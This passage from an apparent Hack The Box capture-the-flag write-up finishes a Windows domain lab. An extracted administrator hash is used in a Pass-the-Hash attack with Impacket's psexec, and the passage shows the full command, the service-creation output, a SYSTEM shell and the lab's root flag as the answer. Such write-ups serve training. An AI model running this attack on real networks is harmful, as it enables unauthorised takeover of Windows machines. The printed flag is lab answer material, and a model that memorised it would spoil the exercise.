<p class="mb-3">We successfully extracted the hash of the administrator (In my case, it is <code>823452073d75b9d1cf70ebdf86c7f98e</code>. It is most likely different for you.), we can perform a Pass-the-Hash attack using Impacket's psexec to get a shell as SYSTEM.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-4g4e9o2rw8]─[~]
└──╼ [★]$ psexec.py egotistical-bank.local/administrator@10.129.95.180 -hashes 823452073d75b9d1cf70ebdf86c7f98e:823452073d75b9d1cf70ebdf86c7f98e
Impacket v0.14.0.dev0+20260407.172353.7fc084ad - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.95.180.....
[*] Found writable share ADMIN$
[*] Uploading file jTCViWIR.exe
[*] Opening SVCManager on 10.129.95.180.....
[*] Creating service MJCM on 10.129.95.180.....
[*] Starting service MJCM.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.973]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> cd C:\Users\Administrator\Desktop\

C:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is 489C-D8FC

 Directory of C:\Users\Administrator\Desktop

07/14/2021  03:35 PM    <DIR>          .
07/14/2021  03:35 PM    <DIR>          ..
09/21/2026  03:01 AM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   7,805,337,600 bytes free

C:\Users\Administrator\Desktop> more root.txt
6ec73931ba6e3f1c4f80b1b27367ea6f
```

<p class="mb-5"><strong>Answer:</strong> 6ec73931ba6e3f1c4f80b1b27367ea6f</p>


<hr />
<section class="text-center" style="margin-top:1.5rem; margin-bottom:1.5rem;">
<p class="mb-1" style="font-style:italic; font-size:1.125rem;">See you in the next Hacking Lab.</p>
<p class="mb-0" style="font-weight:700;">@aaronamran</p>
<p class="text-muted small mt-1">September 2026</p>
</section>

<div class="writeup-nav">
</div>
</div>